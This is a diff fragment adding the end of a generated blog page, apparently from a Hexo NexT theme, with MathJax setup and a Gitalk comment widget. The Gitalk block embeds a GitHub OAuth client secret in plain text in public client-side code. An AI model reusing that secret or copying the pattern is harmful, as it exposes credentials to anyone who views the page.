+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'af497ec42738860108d2',
+      clientSecret: 'ea2d2ca2066183be02881c056867d625b5e3a766',
+      repo        : 'Koios1143.github.io',
+      owner       : 'Koios1143',
+      admin       : ['Koios1143'],
+      id          : '47820837a3db37fd441ca8aca4d9b207',
+        language: 'zh-TW',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
